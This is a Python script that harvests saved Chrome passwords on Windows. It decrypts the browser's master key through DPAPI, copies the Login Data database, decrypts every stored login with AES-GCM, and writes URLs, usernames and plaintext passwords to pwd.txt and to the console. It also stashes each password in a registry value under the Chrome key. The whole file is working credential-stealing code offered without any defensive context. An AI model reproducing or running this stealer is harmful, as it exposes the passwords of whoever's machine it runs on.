import os
import json
import base64
import sqlite3
import win32crypt
#import pycryptodome
from Crypto.Cipher import AES
#import AES
import shutil
import winreg

REG_PATH = r"SOFTWARE\Google\Chrome" # HKEY_LOCAL_MACHINE\

def set_reg(name, value):
    try:
        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH) # REG_PATH + random(1000)
        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REG_PATH, 0,
                                       winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
        print("Set Reg Key")
        return True
    except WindowsError as e:
        print(e)
        return False

def get_master_key():
     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
         local_state = f.read()
         local_state = json.loads(local_state) # txt or bin to py object
     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"]) #декодер б64 или аски в байты
     master_key = master_key[5:]  # removing DPAPI
     master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1] #decrypt data, entropy set none.return tuple
     return master_key

def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
     try:
         iv = buff[3:15]
         payload = buff[15:]
         cipher = generate_cipher(master_key, iv)
         decrypted_pass = decrypt_payload(cipher, payload)
         decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
         return decrypted_pass
     except Exception as e:
         # print("Probably saved password from Chrome version older than v80\n")
         # print(str(e))
         return "Chrome < 80"


master_key = get_master_key()
login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()
file = open("pwd.txt", 'w')
try:
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for r in cursor.fetchall():
        url = r[0]
        username = r[1]
        encrypted_password = r[2]
        decrypted_password = decrypt_password(encrypted_password, master_key)
        if len(username) > 0:
            print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
            file.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
            set_reg('BrowserPswd', decrypted_password)
except Exception as e:
    pass
cursor.close()
conn.close()
file.close()
try:
    os.remove("Loginvault.db")
except Exception as e:
    pass
